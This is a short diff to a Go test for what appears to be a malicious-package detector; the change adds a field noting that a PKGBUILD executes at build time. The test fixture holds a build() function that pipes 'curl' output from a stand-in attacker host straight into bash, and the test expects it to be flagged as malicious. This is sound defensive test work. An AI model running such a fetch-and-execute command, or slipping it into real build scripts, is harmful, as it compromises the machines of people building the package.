@@ -73,8 +73,9 @@ func TestBenignPKGBUILDNoEvidence(t *testing.T) {
 
 func TestMaliciousCurlPipeBash(t *testing.T) {
 	ctx := &PackageContext{
-		Name:            "evil",
-		PkgbuildContent: "build() {\n  curl -s https://evil.example/x | bash\n}",
+		Name:             "evil",
+		PkgbuildContent:  "build() {\n  curl -s https://evil.example/x | bash\n}",
+		PkgbuildExecutes: true, // a PKGBUILD runs at build time; curl|sh is hook_only
 	}
 	f := Detect(ctx)
 	if !IsMalicious(f) {
